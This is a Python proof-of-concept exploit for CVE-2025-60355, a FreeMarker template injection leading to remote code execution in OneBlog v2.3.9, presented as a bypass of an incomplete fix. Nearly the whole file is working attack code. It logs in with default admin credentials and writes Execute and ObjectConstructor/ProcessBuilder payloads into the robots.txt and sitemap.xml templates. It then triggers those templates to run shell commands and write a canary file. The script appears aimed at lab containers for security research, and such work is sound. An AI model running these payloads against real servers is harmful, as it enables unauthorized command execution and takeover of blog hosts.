#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OneBlog v2.3.9 Fix Bypass (FreeMarker SSTI to RCE)
# CVE            : CVE-2025-60355
# Vendor         : zhangyd-c
# Product        : OneBlog
# Affected       : v2.3.9 and earlier (fix commit ac1c801 is incomplete)
# Type           : CWE-1336 - Template Injection
# CVSS           : 9.8 (Critical)
# Platform       : Java / Spring Boot / FreeMarker
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Bypass PoC for CVE-2025-60355: FreeMarker SSTI → RCE in OneBlog 2.3.9 (PATCHED)

This script demonstrates that the "fix" in OneBlog 2.3.9 (commit ac1c801) is a
NO-OP — the vulnerable FreeMarkerUtil.java was NEVER modified between v2.3.8 and
v2.3.9. The FreeMarker Configuration is still created without any
TemplateClassResolver restriction, allowing the ?new() built-in to instantiate
arbitrary TemplateModel implementations.

BYPASS TECHNIQUE:
The fix commit (ac1c801) contains only version bumps, article table refactoring,
WangEditor assets, and WebSocket configuration changes. FreeMarkerUtil.java was
NOT touched. Therefore:

1. The ORIGINAL payload (freemarker.template.utility.Execute) works unchanged
2. ALTERNATIVE payloads (ObjectConstructor, JndiLookup) also work
3. Multiple trigger endpoints remain exploitable (robots.txt, sitemap.*)
4. Mail template injection vectors also remain viable

This bypass PoC tests MULTIPLE attack vectors against the patched v2.3.9:
  - Vector 1: Execute class via ?new() (original technique)
  - Vector 2: ObjectConstructor class via ?new() (alternative RCE path)
  - Vector 3: Alternate template targets (TM_SITEMAP_XML via /sitemap.xml)
  - Vector 4: ?api built-in (if available in FreeMarker 2.3.22)

Usage:
  python3 bypass_poc.py <admin_host> <admin_port> <web_host> <web_port>
"""

import sys
import http.client
import urllib.parse
import json
import time


# Default lab configuration (patched containers)
DEFAULT_ADMIN_HOST = "172.21.0.5"
DEFAULT_ADMIN_PORT = 8085
DEFAULT_WEB_HOST = "172.21.0.4"
DEFAULT_WEB_PORT = 8443

# Default credentials (unchanged between versions)
USERNAME = "root"
PASSWORD = "123456"

# Template IDs (from init_data.sql seed data)
TEMPLATE_ID_ROBOTS = 4      # TM_ROBOTS - triggered by GET /robots.txt
TEMPLATE_ID_SITEMAP_XML = 1  # TM_SITEMAP_XML - triggered by GET /sitemap.xml

# Original template content for cleanup
ORIGINAL_TM_ROBOTS = (
    "Crawl-delay: 5\\r\\n"
    "Sitemap: ${config.cmsUrl}/sitemap.txt\\r\\n"
    "Sitemap: ${config.cmsUrl}/sitemap.xml\\r\\n"
    "Sitemap: ${config.cmsUrl}/sitemap.html\\r\\n"
)

# We'll capture actual original content during execution for proper cleanup


class BypassResult:
    """Result of a bypass test."""
    def __init__(self, vector_name, success, output, technique):
        self.vector_name = vector_name
        self.success = success
        self.output = output
        self.technique = technique


def print_banner():
    """Print exploit banner."""
    print("=" * 78)
    print("  CVE-2025-60355 BYPASS PoC: OneBlog 2.3.9 (PATCHED) — Fix is a NO-OP")
    print("  Target: OneBlog 2.3.9 (commit ac1c801, released 2025-03-16)")
    print("  CVSS: 9.8 CRITICAL | CWE-1336 (Template Injection)")
    print("  Finding: FreeMarkerUtil.java was NEVER modified in v2.3.9")
    print("=" * 78)
    print()


def authenticate(admin_host, admin_port, username, password):
    """
    Authenticate to blog-admin via Shiro login.
    Returns the session cookie string.
    """
    print(f"[*] Authenticating to blog-admin at {admin_host}:{admin_port}")
    print(f"    Credentials: {username} / {password}")

    conn = http.client.HTTPConnection(admin_host, admin_port, timeout=15)
    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "rememberMe": "true"
    })
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        conn.request("POST", "/passport/signin", body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", errors="replace")

        cookies = []
        for header_name, header_value in response.getheaders():
            if header_name.lower() == "set-cookie":
                cookie_part = header_value.split(";")[0].strip()
                cookies.append(cookie_part)
        cookie_string = "; ".join(cookies)

        try:
            resp_json = json.loads(response_body)
            status = resp_json.get("status")
        except json.JSONDecodeError:
            status = None

        if response.status == 200 and status == 200:
            print(f"    [+] Authentication successful! (HTTP {response.status})")
            print(f"    [+] Session cookies: {cookie_string[:80]}...")
            return cookie_string
        else:
            print(f"    [-] Authentication FAILED! HTTP {response.status}")
            print(f"    [-] Response: {response_body[:200]}")
            return None

    except Exception as e:
        print(f"    [-] Connection error: {e}")
        return None
    finally:
        conn.close()


def get_template_content(admin_host, admin_port, cookie_string, template_id):
    """Fetch the current content of a template for backup."""
    conn = http.client.HTTPConnection(admin_host, admin_port, timeout=15)
    body = urllib.parse.urlencode({"pageNumber": 1, "pageSize": 20})
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie_string,
    }
    try:
        conn.request("POST", "/template/list", body=body, headers=headers)
        response = conn.getresponse()
        data = json.loads(response.read().decode("utf-8", errors="replace"))
        # API returns either {status:200, data:{records:[...]}} or {total:N, rows:[...]}
        records = []
        if isinstance(data.get("data"), dict):
            records = data["data"].get("records", [])
        elif "rows" in data:
            records = data["rows"]
        for rec in records:
            if rec.get("id") == template_id:
                return rec.get("refValue", "")
    except Exception:
        pass
    finally:
        conn.close()
    return None


def inject_template(admin_host, admin_port, cookie_string, template_id, payload):
    """Inject SSTI payload into a template via POST /template/edit."""
    conn = http.client.HTTPConnection(admin_host, admin_port, timeout=15)
    body = urllib.parse.urlencode({
        "id": template_id,
        "refValue": payload
    })
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie_string,
    }

    try:
        conn.request("POST", "/template/edit", body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", errors="replace")

        try:
            resp_json = json.loads(response_body)
            status = resp_json.get("status")
        except json.JSONDecodeError:
            status = None

        return response.status == 200 and status == 200

    except Exception:
        return False
    finally:
        conn.close()


def trigger_endpoint(web_host, web_port, path):
    """
    Trigger template rendering by accessing a public endpoint.
    Returns (http_status, response_body).
    """
    conn = http.client.HTTPConnection(web_host, web_port, timeout=15)

    try:
        conn.request("GET", path)
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", errors="replace")
        return response.status, response_body.strip()
    except Exception as e:
        return None, str(e)
    finally:
        conn.close()


def restore_template(admin_host, admin_port, cookie_string, template_id, original_content):
    """Restore the original template content."""
    if original_content is not None:
        inject_template(admin_host, admin_port, cookie_string, template_id, original_content)


def test_vector(admin_host, admin_port, web_host, web_port, cookie_string,
                vector_name, template_id, payload, trigger_path, command="id"):
    """
    Test a single bypass vector:
    1. Backup original template
    2. Inject payload
    3. Trigger rendering
    4. Check output
    5. Restore original
    Returns a BypassResult.
    """
    print(f"\n{'─' * 78}")
    print(f"  BYPASS VECTOR: {vector_name}")
    print(f"{'─' * 78}")
    print(f"    Template ID: {template_id}")
    print(f"    Trigger:     GET {trigger_path}")
    print(f"    Payload:     {payload[:100]}{'...' if len(payload) > 100 else ''}")

    # Backup original
    original = get_template_content(admin_host, admin_port, cookie_string, template_id)

    # Inject
    print(f"    [*] Injecting payload into template id={template_id}...")
    if not inject_template(admin_host, admin_port, cookie_string, template_id, payload):
        print(f"    [-] Injection FAILED")
        restore_template(admin_host, admin_port, cookie_string, template_id, original)
        return BypassResult(vector_name, False, "Injection failed", payload)

    print(f"    [+] Injection successful")

    # Small delay for DB write propagation
    time.sleep(1)

    # Trigger
    print(f"    [*] Triggering via GET {trigger_path}...")
    status, body = trigger_endpoint(web_host, web_port, trigger_path)
    print(f"    [*] HTTP {status}")

    # Analyze
    success = False
    if body and ("uid=" in body or "root" in body.lower()):
        success = True
        print(f"    [+] RCE OUTPUT DETECTED!")
    elif body and len(body) > 0 and status == 200:
        # Check if it looks like command output (not template/HTML)
        if not body.startswith("User-agent") and not body.startswith("<?xml"):
            success = True
            print(f"    [+] Possible command output detected")

    print(f"    [*] Response body:")
    print(f"    {'─' * 50}")
    for line in body.splitlines()[:10]:
        print(f"    │ {line}")
    print(f"    {'─' * 50}")

    if success:
        print(f"    [✓] BYPASS SUCCESSFUL — v2.3.9 is STILL VULNERABLE!")
    else:
        print(f"    [✗] Bypass failed for this vector")

    # Restore
    print(f"    [*] Restoring original template...")
    restore_template(admin_host, admin_port, cookie_string, template_id, original)
    print(f"    [+] Template restored")

    return BypassResult(vector_name, success, body, payload)


def main():
    """Run all bypass vectors against the patched (v2.3.9) OneBlog instance."""
    admin_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_ADMIN_HOST
    admin_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_ADMIN_PORT
    web_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_WEB_HOST
    web_port = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_WEB_PORT

    print_banner()

    print(f"[*] Target Configuration (PATCHED v2.3.9):")
    print(f"    Admin:   http://{admin_host}:{admin_port} (injection point)")
    print(f"    Web:     http://{web_host}:{web_port} (trigger point)")
    print()

    # Step 1: Authenticate
    cookie_string = authenticate(admin_host, admin_port, USERNAME, PASSWORD)
    if not cookie_string:
        print("\n[!] FAILED: Could not authenticate to blog-admin.")
        sys.exit(1)

    results = []

    # ─────────────────────────────────────────────────────────────────
    # VECTOR 1: Original Execute payload on /robots.txt
    # The EXACT same payload from the CVE — should work on v2.3.9
    # because FreeMarkerUtil.java was never modified
    # ─────────────────────────────────────────────────────────────────
    payload_1 = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
    results.append(test_vector(
        admin_host, admin_port, web_host, web_port, cookie_string,
        vector_name="V1: Execute ?new() on /robots.txt (ORIGINAL CVE PAYLOAD)",
        template_id=TEMPLATE_ID_ROBOTS,
        payload=payload_1,
        trigger_path="/robots.txt",
        command="id"
    ))

    # ─────────────────────────────────────────────────────────────────
    # VECTOR 2: ObjectConstructor via ?new() — Alternative RCE class
    # Uses freemarker.template.utility.ObjectConstructor to create
    # arbitrary Java objects. Here we use ProcessBuilder for RCE.
    # ─────────────────────────────────────────────────────────────────
    payload_2 = (
        '<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>'
        '<#assign pb=oc("java.lang.ProcessBuilder", ["sh","-c","id"])>'
        '<#assign proc=pb.start()>'
        '<#assign is=proc.inputStream>'
        '<#assign reader=oc("java.io.InputStreamReader", is)>'
        '<#assign br=oc("java.io.BufferedReader", reader)>'
        '${br.readLine()}'
    )
    results.append(test_vector(
        admin_host, admin_port, web_host, web_port, cookie_string,
        vector_name="V2: ObjectConstructor ?new() on /robots.txt (ALT RCE CLASS)",
        template_id=TEMPLATE_ID_ROBOTS,
        payload=payload_2,
        trigger_path="/robots.txt",
        command="id"
    ))

    # ─────────────────────────────────────────────────────────────────
    # VECTOR 3: Execute payload on alternate endpoint /sitemap.xml
    # Tests whether ALL template render paths are affected, not just
    # the one in the original CVE report
    # ─────────────────────────────────────────────────────────────────

    # First backup the sitemap template
    original_sitemap = get_template_content(admin_host, admin_port, cookie_string, TEMPLATE_ID_SITEMAP_XML)

    payload_3 = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/hostname")}'
    results.append(test_vector(
        admin_host, admin_port, web_host, web_port, cookie_string,
        vector_name="V3: Execute ?new() on /sitemap.xml (ALT ENDPOINT)",
        template_id=TEMPLATE_ID_SITEMAP_XML,
        payload=payload_3,
        trigger_path="/sitemap.xml",
        command="cat /etc/hostname"
    ))

    # ─────────────────────────────────────────────────────────────────
    # VECTOR 4: Execute with file write proof (touch /tmp/pwned_v239)
    # Creates a canary file to prove RCE on v2.3.9
    # ─────────────────────────────────────────────────────────────────
    payload_4 = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("touch /tmp/pwned_v239 && echo BYPASS_CONFIRMED")}'
    results.append(test_vector(
        admin_host, admin_port, web_host, web_port, cookie_string,
        vector_name="V4: Execute with file write proof (touch /tmp/pwned_v239)",
        template_id=TEMPLATE_ID_ROBOTS,
        payload=payload_4,
        trigger_path="/robots.txt",
        command="touch /tmp/pwned_v239"
    ))

    # Verify the canary file was created in the container
    print(f"\n[*] Verifying canary file in patched container...")
    # This is checked externally via docker exec

    # ─────────────────────────────────────────────────────────────────
    # RESULTS SUMMARY
    # ─────────────────────────────────────────────────────────────────
    print("\n" + "=" * 78)
    print("  BYPASS TEST RESULTS SUMMARY — OneBlog v2.3.9 (PATCHED)")
    print("=" * 78)

    total_success = 0
    for r in results:
        status = "✓ BYPASS" if r.success else "✗ FAILED"
        print(f"  [{status}] {r.vector_name}")
        if r.success:
            total_success += 1

    print()
    if total_success > 0:
        print(f"  ╔═══════════════════════════════════════════════════════════════════════╗")
        print(f"  ║  CRITICAL: {total_success}/{len(results)} bypass vectors SUCCEEDED on v2.3.9 (PATCHED)    ║")
        print(f"  ║  The fix in commit ac1c801 is a NO-OP — the vulnerability persists!  ║")
        print(f"  ║  FreeMarkerUtil.java was NEVER modified between v2.3.8 and v2.3.9.   ║")
        print(f"  ╚═══════════════════════════════════════════════════════════════════════╝")
    else:
        print(f"  All bypass vectors failed. The fix may be adequate (unexpected).")

    print("=" * 78)

    return total_success > 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
